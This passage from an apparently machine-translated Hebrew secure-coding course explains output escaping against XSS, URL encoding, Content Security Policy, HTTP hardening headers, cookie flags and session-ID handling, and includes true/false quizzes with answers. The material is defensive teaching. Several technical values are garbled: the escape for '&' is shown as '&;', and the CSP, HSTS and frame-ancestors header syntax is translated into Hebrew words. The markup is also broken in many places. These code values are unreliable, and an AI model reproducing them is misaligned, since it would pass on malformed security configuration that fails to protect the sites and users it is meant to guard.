* ** מבוסס DOM **<br>לקוח האינטרנט שולח את נתוני ההתקפה לעצמו, בדרך כלל באמצעות נתונים המסופקים מהתקפה ולאחר מכן נשלחים באמצעות DOM באמצעות JavaScript.

 XSS היא טעות נפוצה כל כך ביישומי אינטרנט כי זה 2017 OWASP Top 10 #7. XSS נחשב לחלק מ-2021 OWASP Top 10 #3 (הזרקה) במהדורת 2021 שלו. זה גם 2019 CWE Top 25 #2 ו 2021 CWE Top 25 #2. ב- CWE זהו [CWE-79](https://cwe.mitre.org/data/definitions/79.html), *נטרול לא תקין של קלט במהלך יצירת דף אינטרנט ('סקריפטים חוצי אתרים')*.

#### הפתרון של XSS: פלט בריחה

הדרך הסטנדרטית להתמודד עם XSS היא לברוח מכל פלט שעשוי להיות מהתוקף ואינו מאושר באופן ספציפי. במובנים רבים, זהו אמצעי הנגד הטוב ביותר. אם עושים את זה נכון, זה לגמרי נגד ההתקפה והוא מאוד גמיש. לדוגמה, אם יש לך נתוני HTML לא מהימנים של תוקף, החל את בריחות ה- HTML הרגילות, אלא אם כן יש לך סיבה טובה לעשות אחרת:

**בריחות HTML סטנדרטיות**

<table>
  <tr>
    <td>מקורי</td>
    <td> HTML</td>
  </tr>
  <tr>
    <td> שנמלט &</td>
    <td> &;</td>
  </tr>
  <tr>
    <td> <</td>
    <td> &lt;</td>
  </tr>
  <tr>
    <td> ></td>
    <td> &gt;</td>
  </tr>
  <tr>
     <td>"</td>
    <td> &quot;</td>
  </tr>
  <tr>
     <td>'</td>
    <td> &#39; או &apos;</td>
  </tr>
</table>


בחיטוי פלט, בדיוק כמו אימות קלט, לעתים קרובות עדיף לזהות רשימת היתרים ולברוח מהשאר. עם זאת, לפעמים בריחות פלט נדרשות הן רשימה מוגדרת היטב שניתן להחיל ישירות, מכיוון שלפעמים אתה *יכול* למנות בבטחה את הקטגוריות כפי שעשינו כאן עבור HTML. ישנם מקרים טכניים שבהם אינך צריך להחיל את הבריחות על נתונים לא מהימנים, אך ב- HTML זה לעתים קרובות פשוט ומהיר יותר פשוט להחיל את כולם באופן אוטומטי, אלא אם כן יש לך צורך ספציפי להתיר משהו אחר. כמובן, אלה רק הבריחות עבור HTML עצמו; אלה אינם מספיקים כשלעצמם עבור תבניות נתונים אחרות (כגון כתובות URL מוטבעות וכותרות HTTP).

הנה הבעיה: אתה צריך להיות *מושלם*. אם אתה בורח מהפלט בצורה נכונה 99.9% מהזמן, ואתה מייצר פלט ב-1,000 מקומות, התוכנית שלך פגיעה. ** אתה אולי גאון, אבל זה לא רלוונטי; אפילו גאונים עושים טעויות. גם אם התוכנה הייתה  מושלמת *במקור*, שינוי מאוחר יותר יכול בקלות להציג פגיעות. אנו זקוקים לפתרון טוב יותר מאשר "*לעולם אל תעשה טעות שקל לעשות*" - במיוחד כאשר משהו קורה שוב ושוב.

ברוב המקרים, הפתרון הטוב ביותר עבור XSS הוא **_לבחור מסגרת או ספריה שנמלטת באופן אוטומטי מפלט HTML עבורך_**. בדרך זו, הפלט בורח נעשה, אבל אתה לא צריך כל הזמן לחשוב על זה. במקום זאת, מערכת הפלט בורחת באופן אוטומטי מהפלט עבורך (פעולה זו נקראת לפעמים *בריחה אוטומטית*). בריחה זו נעשית בדרך כלל באמצעות אחת ממערכות הטמפלציה הרבות הזמינות המאפשרות לך לציין את התבנית הקבועה (שהיא מהימנה ולכן עוברת ללא הרחקה) ואת הנתונים (כאשר נתונים לא מהימנים נמלטים כברירת מחדל).

יש הרבה אפשרויות שעושות את זה. ספריית JavaScript React, לדוגמה, בורחת כברירת מחדל מכל הערכים המוטבעים בשפת JSX שלה לפני עיבודם. Ruby on Rails בורח מערכי HTML כברירת מחדל בעת שימוש בתבניות ERB שלו. מסגרת האינטרנט של Python Flask משתמשת בספריית התבניות של Jinja כדי לעבד תבניות, ו- Jinja מבצעת חילוץ אוטומטי של נתונים המעובדים בתבנית HTML. זו בהחלט לא רשימה מלאה; בריחה אוטומטית היא יכולת נפוצה מאוד במסגרות אינטרנט. מומלץ מאוד לבחור רק מסגרות אינטרנט וספריות פלט שיחמקו מ- HTML כברירת מחדל; יש הרבה טובים לבחירה.

#### כאשר אתה צריך לאפשר נתונים לא מהימנים שלא נמלטו

מדי פעם אתה *צריך* לאפשר לנתונים שלא נמלטו לעבור. אחת הסיבות לכך שייתכן ** שתרצה  להשמיט כמה בריחות היא שאתה רוצה שלנתונים לא מהימנים תהיה פעולה כלשהי שהבריחה תמנע. לדוגמה, נניח שברצונך שמשתמשים לא מהימנים יספקו HTML שיהפוך חלק מהטקסט שלהם לנטוי. במקרה כזה, תרצה לתת **<i> ** וכן **</i>**  (נטוי) דרך, למרות שבדרך כלל היית בורח מה**- < ** וכן **>**  תווים.

הבעיה היא שברגע שאתה מאפשר לכל דבר נוסף לעבור, הקוד הדרוש כדי לברוח כראוי פלט הוא הרבה יותר מסובך. לדוגמה, עליך לוודא שלכל תג פותח (**<i>**) יש תג תואם, שהוא מקנן כראוי, שאין לו תכונות או שתכונות אלה מותרות בעצמן, ושרק התגים והתכונות שאתה מאפשר מאפשרים לו לעבור. ישנם מקרים רבים שבהם זה הופך להיות פגיעות. אחרי הכל, מסגרות רבות בורחות מנתונים כברירת מחדל, אבל כאשר מפתחים צריכים לתת למשהו לעבור, הם לפעמים מאפשרים *יותר מדי* דרך.

במקרה כזה, במידת האפשר, השתמש בספריות *שכבר תוכננו* לאפשר רק את מה שאתה רוצה, וברח מכל השאר. לרוב שפות התכנות והמסגרות הנפוצות כבר יש ספריות שמאפשרות לך לציין מה לתת לעבור, ואז לברוח, להפשיט או לאסור את השאר.

#### כתובות URL

התמקדנו בבריחה מ- HTML, מכיוון שזו הבעיה הגדולה ביותר ביישומי אינטרנט. אבל HTML יכול להטמיע סוגים אחרים של נתונים, ומתוכם, אולי הנפוצים ביותר הם כתובות URL.

יש גם לברוח מכתובות URL מוטבעות, והכללים לבריחה מכתובות URL שונים. תחביר כתובת האתר הוא בדרך כלל **סכימה&#58; [סמכות]נתיב[?שאילתה]&#8202;[&#35;קטע]** . לדוגמה, בכתובת ה- URL **<https://www.linuxfoundation.org/about/>**, הסכימה היא "**https**", סמכות "<b>www.linuxfoundation.org</b>", הנתיב הוא "**/about/**", ודוגמה זו אינה כוללת שאילתה או חלק מקטע. לפעמים אתה זקוק לתווים מיוחדים בנתיב, בשאילתה או במקטע. הדרך המקובלת לברוח מחלקים אלה של כתובות ה- URL היא לוודא תחילה שהנתונים מקודדים באמצעות UTF-8, ולברוח כ- "**%**hh" (כאשר **hh** הוא הייצוג ההקסדצימלי) כל הבתים למעט בתים "בטוחים", שהם בדרך כלל **A-Z, **a-z**, 0-9**, "**.** **  ", "**-**", "**&#42;**  **", ו-"**&#95;** ". שגרת Java **java.net.URLEncoder.encode()** הופכת את כל החללים ל- "**+**" במקום ל- "**%20**"; הן המוסכמות** "+**" והן "**%20**" נמצאות בשימוש נרחב.

#### חלופות ל-XSS

בדרך כלל עליך להשתמש במסגרת שנמלטת באופן אוטומטי מ- HTML כברירת מחדל.

אם מסיבה כלשהי אתה לא יכול, אתה יכול לבנות עטיפה שעושה את הבריחה בשבילך ושולחת את הפלט. עטיפה מסוכנת יותר אם קל לא לקרוא לעטיפה. אם אתה משתמש בעטיפה, גם העטיפה אמורה לבצע את הפלט. אם אתה קורא בנפרד שגרת בריחה ולאחר מכן להתקשר כדי לייצר פלט, אז זה קל במיוחד לשכוח לקרוא את העטיפה. לדוגמה, אם תעשה  SendOutput(EscapeHTML(data)**), יהיה קל מדי להשתמש במקום  זאת **ב-SendOutput(data) הפגיע ** .**

חלופה המוצעת לעתים היא להשתמש בסינון קלט קשיח מאוד שמונע את כל המטא-תווים של HTML (**& < > > " ' **). בתיאוריה, זה מונע XSS ב- HTML. אם אתה *יכול* להגביל את  הקלט שלך כך, עליך לעשות זאת, מכיוון שאתה תמיד צריך להגביל את הקלטים הלא מהימנים שלך ככל האפשר. בפועל, בעוד סינון קלט קשה יכול לעזור להתמודד עם התקפות אחרות, זה בדרך כלל *לא* מספיק כדי להתמודד עם XSS. הבעיה היא שבדרך כלל חלק מהכניסות בסופו של דבר צריכות לאפשר כמה מטא-תווים של HTML. לדוגמה, או'מאלי לא יהיה מרוצה ממערכת שלא אפשרה ציטוטים בודדים בשם. אפילו מערכת שמתחילה עם מגבלה זו לעתים קרובות עולה עליה, כך שלא ניתן לסמוך על אימות קלט קשה *בפני עצמו* כדי להתמודד עם XSS. כן, השתמש באימות קלט קשה היכן שניתן כאמצעי הקשחה - אך זה לא מספיק כדי להתמודד עם XSS.

אמצעי התקשות קל מאוד הוא להגדיר את התכונה **HttpOnly** על עוגיות. באופן זה, אם סקריפט זדוני מופעל, הוא לא יכול לראות את ערך קובץ ה- Cookie. עליך ** להגדיר מגבלה זו כאשר אתה יכול, מכיוון שהיא מגבילה את הפריבילגיה, אך זהו אמצעי התקשות מתון מאוד שהוא שימושי רק אם אתה מיישם * גם אמצעים* אחרים.

XSS הוא בדרך כלל הטוב ביותר נגד על ידי בחירת מסגרת או ספריה כי באופן אוטומטי בורח פלט בשבילך. עם זאת, תוכניות לעתים קרובות יש יציאות רבות. עדיף שנשלב את הפתרון הזה עם משהו אחר שהגביל את הנזק כאשר *נעשית* טעות  . באינטרנט יש פתרון: מדיניות אבטחת התוכן (CSP). היחידה הבאה תדון בכך.

#### חידון 4.2: התמודדות עם סקריפטים חוצי אתרים (XSS)

\>\>בחירת מסגרת או ספריה שנמלטת באופן אוטומטי מפלט HTML היא לעתים קרובות אחת הדרכים הטובות ביותר להתמודד עם התקפות XSS. אמת או שקר?<<

(x) נכון

( ) לא נכון

[הסבר]

זה נכון. יישומי אינטרנט רבים מייצרים קטעים רבים של HTML, וזה לא מעשי לזכור לברוח באופן ידני מכל אחד מהם. במקום זאת, השתמש במערכת שנמלטת מהם באופן אוטומטי. במקרים מסוימים, יהיה עליך לעקוף זאת, אך ניתן לבדוק בקפידה דריסות אלה בכל שימוש כדי לוודא שהן מאובטחות.

כמובן, אמצעים אחרים יכולים לעזור גם כן, אבל לאחר ** ברירות מחדל תכנות מאובטח אומר כי בדרך כלל יש פחות בעיות מלכתחילה.

[הסבר]

### מדיניות אבטחת תוכן (CSP)

[יישום אינטרנט]

בעת יצירת יישומי אינטרנט, כלי חשוב באמת להגבלת נזק הוא *מדיניות אבטחת תוכן* (CSP). אם הוא קיים, ה- CSP אומר לדפדפן האינטרנט המקבל מה מותר ומה אסור מנקודת מבט של אבטחה. CSP כשלעצמו אינו מונע את רוב ההתקפות, אך יכול להפוך פגיעויות רבות לקשות יותר לניצול או להפחית במידה ניכרת את ההשפעה שלהן. זה הופך את CSP *לאמצעי הגנה חשוב לעומק* כדי להפחית את הסיכון.

בדרך כלל הפניה ל- CSP נשלחת ככותרת HTTP (הנקראת **תוכן-אבטחה-מדיניות**), וכמו כל כותרות HTTP, המשתמש מקבל אותה *לפני* שהמשתמש מקבל את התוכן העיקרי. ניתן גם לשלוח פרטי CSP כ**-<meta>**  רכיב HTML עם  התכונה **http-equiv** המוגדרת **כמדיניות-אבטחה-תוכן**. עם זאת, באמצעות **<meta>**  אלמנט אינו טוב כמו שימוש בכותרת HTTP, מכיוון שהמערכת כבר החלה לעבד את ה- HTML בשלב זה. לכן נסה להשתמש בכותרת HTTP במקום זאת. אם אתה צריך להשתמש ב- CSP באמצעות רכיב HTML, כלול את זה **<meta>**  אלמנט ברגע שתוכל ב- HTML שלך, כך שהוא ייכנס לתוקף בהקדם האפשרי.

אולי יכולת ה- CSP החשובה ביותר היא ש- CSP יכול לקבוע אילו סקריפטים מורשים לפעול. כברירת מחדל, דפדפן אינטרנט מפעיל את כל הסקריפטים שנשלחו אליו. זה נורא אם יש פגיעות XSS, כי ההתקפה עשויה להיות מסוגלת להגניב קוד לתוך הדף ולגרום לדפדפן האינטרנט של הקורבן להפעיל אותו. פתרון מאובטח טוב יותר הוא להפריד את הקוד מהנתונים ולהגביל את ההרשאה. אנחנו יכולים לעשות את זה עם CSP.

הנה CSP פשוט שמונע מספר רב של התקפות. CSP זה אומר כי משאבים (בפרט סקריפטים וסגנונות) הם רק מאתר המקור ('**self' **), וכי **** **מוטבעים או evals** עבור סקריפטים וסגנונות אינם מותרים (כי הם לא הותרו במפורש):

**תוכן-אבטחה-מדיניות: ברירת מחדל-src 'עצמי';**

האתגר עם CSP זה הוא שכדי להשתמש בו במלוא הפוטנציאל שלו, עלינו *להפסיק להשתמש* בסגנונות ובסקריפטים מוטבעים. קוד HTML יכול לבקש *טעינה* של קובצי JavaScript וסגנונות CSS, אך סגנונות JavaScript ו- CSS חייבים להיות בקבצים נפרדים. קוד HTML עשוי לכלול מידע רב החשוב לסקריפטים ולסגנונות (כגון **התג**, **המחלקה** **והמזהה**), אך ל- HTML אין אפשרות להטביע סקריפטים וסגנונות ישירות.

לעולם לא להשתמש בסקריפטים וסגנונות מוטבעים נחשב לפרקטיקה טובה, אבל זה יותר מזה; זה משפר באופן דרמטי את האבטחה. אם מתעלמים מסקריפטים וסגנונות מוטבעים, התקפת XSS החותרת תחת דף אינטרנט של HTML *אינה יכולה* לגרום בקלות לשימוש בסקריפט או בסגנון לא מהימנים. זה לא מונע את כל ההתקפות, אבל זה כן מונע הרבה, וזה הופך התקפות אחרות לקשות יותר באופן דרמטי. אם אתה יכול *להפסיק* להשתמש בכל הסקריפטים והסגנונות המוטבעים, ולאכוף זאת באמצעות CSP, המערכת הופכת לעמידה יותר בפני מגוון התקפות.

אבל מה אם מדיניות זו קשה מדי ליישום בדף, או שאינה עונה על הנסיבות שלך? זו לא בעיה; פשוט השתמש ב- ** CSP אחר עבור דף זה. מפרט CSP כולל מגוון אפשרויות שבהן באפשרותך להשתמש כדי לאפשר פעולות נוספות ולהגביל אחרות.

כמו תמיד, המטרה שלך היא הכי פחות פריבילגיה: נסה להפוך את ה- CSP למגביל ככל שתוכל. לעתים קרובות תקבל את התועלת הרבה ביותר אם תשנה את המערכת שלך כך שהיא תוכל להשתמש ב- CSP מגביל יותר בכל הדפים, אך אפילו להגבלה קטנה יכולים להיות כמה יתרונות. דרכים נפוצות להרפיית המגבלות על סקריפטים וסגנונות הן:

1. השתמש ב- CSP מגביל בדפי אינטרנט רבים ככל האפשר, כגון התרת סקריפטים וסגנונות רק ממיקומים ספציפיים באתר האינטרנט שלך (לעולם לא מוטבע). ואז להקל את ההגבלות על דפים שבהם זה כרגע קשה.

2. אפשר טעינת סקריפטים וסגנונות מאתרים ספציפיים אחרים. באפשרותך להגדיר **את default-src** (המקום שבו נטענים קובצי מקור של סקריפט) כדי לאפשר אתרי אינטרנט ספציפיים אחרים שאתה מפרט. פעולה זו מודיעה לדפדפן האינטרנט שאתה נותן אמון מלא באתרים ספציפיים אלה. תיזהר; זה יכול לפגוע בפרטיות המשתמש. לדוגמה, כל ארגון שמנהל אתרים אחרים אלה יידע *לפחות* בכל פעם שמשתמש יאחזר מידע זה ואת כתובת ה- IP שלו.

3. אפשר קודי Hash ספציפיים. באפשרותך להגדיר ** את default-src** כדי לאפשר תוכנית מוטבעת ספציפית על-ידי אמירה שניתן לבצע את הגיבוב הקריפטוגרפי שלה באמצעות התבנית ** '<hash-algorithm>-<base64-value>'** . זה יכול להיות שלב ביניים שימושי אם יש לך סקריפטים מוטבעים קיימים, אם כי בטווח הארוך, עדיף להעביר סקריפטים אלה לקובץ נפרד.

ל- CSP יש מנגנונים שונים אחרים להגבלת הרשאות. פרמטר CSP נוסף שחשוב במיוחד הוא **אבות המסגרת**, שהוא כלי נהדר להתמודדות עם התקפות clickjacking. מתקפת קליקים היא התקפה שבה תוקף יכול "לחטוף" קליק שהמשתמש התכוון למטרה אחת, אך למעשה הקליק "נחטף" כדי לעשות משהו אחר. תוקפים עושים זאת בדרך כלל על-ידי שימוש לרעה ביכולות המסגרת של HTML. אם אינך משתמש במסגרות - ורוב האתרים לא - אתה יכול לתקן זאת בקלות על ידי הכללת "**אבות המסגרות 'אף אחד';** " בפוליסה שלך. אם אתה משתמש במסגרות, השתמש ב"**מסגרות-אבות 'עצמיים'; **" במקום זאת.

כאשר אתה מפתח אתר, ייתכן שיהיה זה חכם לעבור על מפרט CSP ולנסות להגביל באופן מקסימלי את מה שאתה מבקש מדפדפני אינטרנט לאפשר. ככל שאתה מאפשר פחות, כך התוקפים יכולים לעשות פחות אם אתה עושה טעות. ישנן כותרות HTTP אחרות שיכולות לעזור להקשיח אתר מפני התקפה; ביחידה הבאה נסתכל על כמה.

#### חידון 4.3: מדיניות אבטחת תוכן (CSP)

\>\>שימוש בקביעת CSP האוסרת על קבצי Script מוטבעים, דורש ש- JavaScript יופעל רק ממיקומים מהימנים ספציפיים, והעברת כל JavaScript לקבצים נפרדים למיקומים אלה יכולה להפחית את ההשפעה של התקפות Scripting מרובי אתרים (XSS). אמת או שקר?<<

(x) נכון

( ) לא נכון

[הסבר]

זה נכון. CSP אינו מבטל את כל הבעיות, אך CSP מאפשר לך לאסור על סקריפטים מוטבעים ובמקום זאת דורש טעינת JavaScript ממיקומים מהימנים ספציפיים. בתצורה זו, התקפות XSS אינן יכולות עוד להוסיף בקלות קוד JavaScript זדוני, וזה יכול להפחית את ההשפעה של התקפות XSS.

[הסבר]

### כותרות הקשחה אחרות של HTTP

[יישום אינטרנט]

כאשר אתה מספק דפי אינטרנט אתה יכול להגביל את מה שניתן לעשות עם התוצאות, מה שמקשה על התוקפים לגרום נזק חמור. בקיצור, יש כותרות HTTP אחרות שאתה יכול להגדיר שיכולות לפעמים להקשיח את היישומים שלך מפני התקפות. כבר דנו במדיניות אבטחת התוכן (CSP), שהיא אולי החשובה ביותר. הנה כמה כותרות HTTP אחרות שכדאי לשקול להשתמש בהן:

* **X-Content-Type-Options**<br>יש להגדיר זאת ל- **nosniff**, כלומר סוגי ה- MIME המסופקים נכונים ושהמקלט לא צריך לנסות לנחש מהו הסוג. משמעות הדבר היא שהתוקפים לא יוכלו להטעות את דפדפן האינטרנט להשתמש בסוג אחר.

* **X-Frame-Options**<br>אפשרות זו צריכה להיות מוגדרת כ**- DENY** או **SAMEORIGIN.** בדומה **לאבות הקודמים של מסגרות** CSP, פעולה זו מונעת את השימוש במסגרות או מאפשרת אותן רק מהמקור, ובכך מתמודדת עם התקפות לחיצה רבות. מבחינה טכנית, X-Frame-Options התיישן על-ידי  אבות קדמונים של מסגרות CSP**, אך אם ייתכן שיש לך משתמשי Internet Explorer (IE), אתה זקוק גם לכך מכיוון ש- IE אינו תומך **באבות קדמונים של מסגרות CSP**.**

* **HTTP Strict-Transport-Security (HSTS)**<br>משמעות הדבר היא שרק ** פרוטוקול  HTTPS המאובטח, ולא פרוטוקול HTTP הלא מאובטח, מותר לביקורים עתידיים באתר זה למספר שניות נתון. הגדרה נפוצה היא "**קפדנית-תחבורה-אבטחה: מקסימום-גיל=31536000;** " כלומר *רק* HTTPS יורשה במשך שנה (המספר הוא מספר השניות). מספר גדול יותר זה בסדר.

אם האתר שלך נגיש לציבור, תוכל לבדוק בקלות את הכותרות שלך באמצעות [אתר האינטרנט של כותרות האבטחה](https://securityheaders.com/).

כמו כן, מילה חשובה על כותרות HTTP באופן כללי. באפשרותך להחליט, מסיבות שונות, לספק כותרות HTTP אחרות. אם חלק מפרטי הכותרת עשויים להגיע מתוקף, היזהר *במיוחד*. כמו תמיד, בצע אימות קלט זהיר מאוד. יש התקפה מגעילה, בפרט, שבה התוקף מצליח להכניס שורה חדשה בקלט; פעולה זו תגרום לפיצול *כותרת* HTTP  בגירסאות HTTP 1.1 ו- 2, כאשר שאר הטקסט לאחר השורה החדשה עשוי להתפרש ככותרת HTTP שסופקה על-ידי התוקף. זה יכול להשבית הגנות רבות או אפילו ליישם התקפה.

#### חידון 4.4: כותרות הקשחת HTTP אחרות

\>\>בעת שליחת מידע באמצעות HTTP, באפשרותך להגדיר כותרות HTTP שונות (כגון HTTP Strict-Transport-Security (HSTS)) כדי לסייע בהקשחת המערכת מפני התקפה. אמת או שקר?<<

(x) נכון

( ) לא נכון

### עוגיות ומפגשי התחברות

[יישום אינטרנט]

מנגנון חשוב בפרוטוקול HTTP הוא תמיכה בעוגיות**. קובצי Cookie הם נתחים קטנים של נתונים הנשלחים משרת אינטרנט לדפדפן אינטרנט. מכאן ואילך, כאשר דפדפן האינטרנט יוצר קשר עם שרת אינטרנט זה, דפדפן האינטרנט ישלח את ערך קובץ ה- Cookie בחזרה לשרת שממנו הוא הגיע, בכפוף למגבלות מסוימות.

#### תכונות עוגיות

שרתי אינטרנט יכולים גם להגדיר תכונות מסוימות בקובצי ה-Cookie שהם שולחים. לדוגמה:

* זמן תפוגה: אם לא מוגדר זמן תפוגה, תוקף קובץ ה-Cookie יפוג כאשר הדפדפן יוצא (קובצי Cookie כאלה נקראים קובצי Cookie *של הפעלה*). אחרת, הדפדפן עשוי לאחסן את קובץ ה- Cookie לצמיתות עד תום הזמן (קובצי Cookie כאלה נקראים קובצי *Cookie קבועים* - משתמש *יכול* למחוק קובצי Cookie אלה, אך מעטים עושים זאת).

* **דגל מאובטח**: אם הוא מוגדר, קובץ ה- Cookie יישלח רק לשרתי HTTPS, ולא ל- HTTP. אתה צריך להגדיר את זה בכל פעם מעשית.

* **דגל HttpOnly**: קובץ ה-Cookie אינו גלוי לתוכניות JavaScript. אתה צריך להגדיר את זה בכל פעם מעשית.

* **SameSite**: יש לזה שלושה ערכים עיקריים - **אין**, **לקס**, וקפדני**.** "**ללא**" פירושו שקובצי Cookie נשלחים תמיד לשרת האינטרנט התואם. " **לקס**" פירושו שעוגיות  נשלחות אם הן **GET** (קליק) באתר אינטרנט של צד שלישי, אחרת עוגיות נשלחות רק אם הבקשה מגיעה מאותו אתר. " **קפדני**" פירושו שקובצי Cookie נשלחים רק בהקשר של צד ראשון; כל בקשה מאתר אחר *לא* תגרום לשליחת קובץ ה- Cookie. מבחינה היסטורית, ברירת המחדל של דפדפן האינטרנט הייתה למעשה ללא, ****אך דפדפני אינטרנט מודרניים פועלים כעת עם **Lax** כברירת המחדל מכיוון שזה נוגד התקפות מסוימות. נדון בזה בהמשך, אבל אתה צריך להגדיר את זה לפחות **לקס** בכל מקום מעשי.

#### עוגיות בהקשר

עוגיות אינן, כשלעצמן, בהכרח זדוניות. עם זאת, קובצי Cookie יכולים לחשוף מיהו המבקש במקרים מסוימים, מה שהופך אותם לבעיית פרטיות פוטנציאלית. זה נכון במיוחד עבור קובצי Cookie שיש להם **SameSite=None**. אם מישהו מגדיר בקשות לקובץ Cookie מסוג זה באתרי אינטרנט רבים (לדוגמה, על-ידי הטבעת תמונות של צד שלישי), ניתן להשתמש בקובץ ה- Cookie כדי לעקוב אחר פעולותיו של משתמש זה באתרים רבים. קובץ Cookie שנועד לעקוב אחר משתמשים באתרי אינטרנט שונים נקרא *קובץ Cookie למעקב*. מעקב אחר קובצי Cookie יכול להיות גרוע עוד יותר אם יש להם זמן תפוגה ארוך, מכיוון שקובצי Cookie כאלה נמשכים לאחר יציאת הדפדפן. עוגיות מעקב משכו את החששות של מדינות רבות בגלל השפעתן המזיקה על פרטיות המשתמשים. כתוצאה מכך, נחקקו חוקים שונים הכוללים עוגיות והסכמה. עם זאת, הטמעת עוגיות מעקב אינה הדרך היחידה להשתמש בעוגיות; קובצי Cookie יכולים גם לשפר את האבטחה.

קובצי Cookie חשובים בין השאר משום שהם משמשים לעתים קרובות ליישום הפעלות התחברות באינטרנט (WWW). הפעלת התחברות היא פשוט פרק זמן של פעילות בין הרגע שבו משתמש מתחבר ומתנתק. לפרוטוקול WWW המקורי לא הייתה דרך ליישם הפעלות התחברות, וקובצי Cookie מספקים מנגנון פשוט לתמיכה בהפעלות התחברות.

#### עוגיות והפעלות התחברות

באינטרנט, דרך נפוצה ליישם הפעלת התחברות היא לקבל טופס כניסה. אם הכניסה מצליחה, שרת האינטרנט שולח "**מזהה הפעלה**" בתוך ערך קובץ Cookie. מזהה ההפעלה הוא פשוט מספר אקראי גדול שאף אחד אחר לא יכול לנחש. מכאן ואילך, דפדפן האינטרנט שולח קובץ Cookie זה (עם מזהה ההפעלה) בכל פעם שהוא יוצר קשר עם שרת אינטרנט זה. שרת האינטרנט יכול לבדוק מזהה הפעלה זה כדי לראות מי מגיש את הבקשה... ואם מזהה מופע זה חוקי, שרת האינטרנט מחפש את מזהה המשתמש עבור אותה הפעלה ומאפשר למשתמש לעשות כל מה שהמשתמש מורשה לעשות. הכללת מזהה הפעלה בקובץ  Cookie **אינה** הדרך היחידה להשתמש בקובצי Cookie כדי לתמוך בכניסה, אך זוהי גישה נפוצה.

בדרך כלל, בעת פיתוח יישומי אינטרנט, תשתמש במסגרת או בספריה שמטפלת (בעיקר) בהפעלות התחברות עבורך. זה בסדר, רק לבדוק כדי לוודא שזה מאובטח. כאן נסקור כמה תכונות מפתח לחפש. במקרים מסוימים, המסגרת שלך לא תעשה זאת בעצמה, אך תוכל לנקוט כמה צעדים נוספים כדי לגרום להם לקרות.

ראשית, אם המסגרת שלך משתמשת במזהי הפעלה בקובצי Cookie (גישה נפוצה), חיוני שהיישום לא יאפשר לתוקפים לנחש או לגלות את מזהי ההפעלה. אם תוקף יכול לקבל את מזהה ההפעלה, התוקף יכול לפעול עם אותן הרשאות כמו המשתמש המחובר! במקרה נפוץ זה, בדוק את גורמי המפתח הבאים לפחות:

1. מזהה ההפעלה חייב לכלול לפחות 128 סיביות של נתונים אקראיים.

2. יש ליצור את מזהה ההפעלה באמצעות  מחולל מספרים פסאודו-אקראיים *מאובטח באופן קריפטוגרפי* (CSPRNG). כל דבר שניתן לניחוש (כמו  "*הוסף אחד למזהה ההפעלה האחרון" * או * "קריאה רגילה אקראית()")* אינו מקובל. נדון בכך ביתר פירוט בהמשך.

3. הצפן מזהי הפעלה בין שרת האינטרנט לדפדפן האינטרנט. הפתרון הרגיל הוא להגדיר את הדגל המאובטח של קובץ ה- Cookie **** ולתקשר תמיד באמצעות HTTPS (TLS).

שנית, הגדר את התכונות של קובצי Cookie המכילים מזהי הפעלה כמאובטחים:

1. כפי שצוין קודם לכן, כאשר מעשי להגדיר עוגיות לטיפול בהפעלת התחברות עם  דגל **HttpOnly**. בדרך זו, לתוכניות JavaScript לא תהיה גישה ישירה אליו. זוהי דוגמה נוספת לפריבילגיה מינימלית; אם אין צורך בהרשאה, אל תספק את הגישה.

2. באופן דומה, שקול להשתמש בקובצי Cookie של הפעלה (קובצי Cookie ללא זמן תפוגה) עבור קובצי Cookie המאחסנים מידע על הפעלות התחברות. אתה לא חייב לעשות את זה; באפשרותך להשתמש בקובצי Cookie קבועים כדי לאחסן פרטי הפעלה. אבל אם אתה משתמש בקובצי Cookie קבועים, שקול להגביל את הזמן לכמה ימים לכל היותר. קבצי Cookie קבועים מאוחסנים באחסון קבוע, וייתכן שתוקף יוכל לקבל גישה למידע מאוחסן זה.

שלישית, ודא שיש לך פונקציות התחברות והתנתקות, ושהן אכן פועלות כראוי!

בכל פעם שמשתמש נכנס בהצלחה, ודא שהמשתמש *מקבל תמיד* ** מזהה הפעלה חדש (זה מוחזר בדרך כלל בקובץ Cookie). בפרט, אסור שהצד המקבל של הכניסה *יעשה* שימוש חוזר בערכי הפעלה. כניסה חדשה פירושה שמתבצעת בקשה להפעלה חדשה (גם אם כבר קיימת הפעלה נוכחית), לכן ודא שהפעלה חדשה נוצרת ומשמשת עבור בקשה זו! אם התוכנית שלך אינה מצליחה ליצור הפעלה חדשה עבור כניסה חדשה, היא עלולה להיות פגיעה *להתקפת קיבוע הפעלה*.

 קיבוע הפעלה הוא גורם כה נפוץ לפגיעויות אבטחה שהוא 2019 CWE Top 25 #37. זה [CWE-384](https://cwe.mitre.org/data/definitions/384.html).

באופן דומה, ודא ** שאתה מספק למשתמשים פעולת "התנתקות" ("התנתקות") שבאמת *פועלת*. אם אתה משתמש במזהי הפעלה - גישה נפוצה - התנתקות אמורה לבטל את תוקפה של הפעלה זו. בדרך כלל משמעות הדבר היא שעליך להסיר את הרשומה של מזהה מופע זה ממסד הנתונים של השרת המתעד מזהי הפעלה פעילים (ואת מזהה המשתמש שכל מזהה מופע חל עליו). כמו כן, עליך להורות לדפדפן למחוק את קובץ ה- Cookie או לפחות את ערך מזהה ההפעלה בקובץ Cookie זה. בדרך זו, המשתמש למעשה מנותק. משתמשים מתנתקים כדי להפחית את הסיכונים שלהם, אבל זה לא עובד אם היישום לא באמת לנתק אותם. מספר גדול באופן מפתיע של אתרים גדולים, בשלב זה או אחר, לא ניתקו משתמשים כאשר הם ביקשו זאת.

בסופו של דבר עליך גם לנתק הפעלה לא פעילה באופן אוטומטי. כמה דרכים קלות לעשות זאת הן לא להגדיר תאריך תפוגה (כך שהמשתמש יתנתק כאשר הוא יכבה את הדפדפן שלו) או להגדיר תאריך תפוגה למועד שבו המשתמש יתנתק. מסגרות בדרך כלל יאפשרו לך להגדיר זאת בקלות.

#### חידון 4.5: עוגיות והפעלות התחברות

\>\>כאשר משתמש מתחבר שוב, השתמש שוב במזהה ההפעלה אם מזהי הפעלה נמצאים בשימוש וכבר קיימים, כדי להפחית את הבלבול עבור המשתמש. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

זה לא נכון. אם משתמש מתחבר שוב, הוא מבקש הפעלה חדשה. כבדו את הבקשה הזו על ידי יצירת מפגש חדש!

שימוש חוזר בהפעלה קיימת יכול, ביישומים מסוימים, לפתוח מערכת להתקפה הנקראת קיבוע הפעלה. לא נכנסנו לפרטים של קיבעון סשן בקורס הזה, אבל זה בגלל שאמצעי הנגד ("אל תעשה שימוש חוזר במזהי סשן") הרבה יותר קל להסבר מאשר ההתקפה.

[הסבר]

### CSRF / XSRF

[יישום אינטרנט]

